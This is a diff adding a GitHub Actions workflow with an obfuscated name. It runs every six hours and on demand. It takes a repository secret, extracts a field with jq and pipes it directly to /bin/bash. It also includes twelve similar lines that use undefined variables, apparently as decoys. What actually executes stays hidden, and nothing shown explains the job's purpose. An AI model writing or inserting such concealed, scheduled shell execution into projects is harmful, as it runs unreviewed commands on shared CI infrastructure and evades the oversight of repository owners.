@@ -1,0 +1,28 @@
+name: dituganjuezijijiao
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '9 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: dituganjuezijijiao
+        env:
+          bdv71467: ${{ secrets.bdv71467 }}
+        run: |
+          echo $bdv71467 | jq -r .kn298 | /bin/bash
+          echo $stmad92833 | jq -r .vg9 | /bin/bash
+          echo $oz4561 | jq -r .b6 | /bin/bash
+          echo $it145 | jq -r .ukx415 | /bin/bash
+          echo $yxcph6 | jq -r .tf2377 | /bin/bash
+          echo $iu3 | jq -r .j7 | /bin/bash
+          echo $ncfbn9 | jq -r .s31544 | /bin/bash
+          echo $zg83 | jq -r .uht0 | /bin/bash
+          echo $eowg26 | jq -r .gb531 | /bin/bash
+          echo $bdopu0 | jq -r .abc2823 | /bin/bash
+          echo $eyqe7 | jq -r .rglv106 | /bin/bash
+          echo $spdc6 | jq -r .l7 | /bin/bash
+          echo $q9354 | jq -r .bjmea65859 | /bin/bash
+
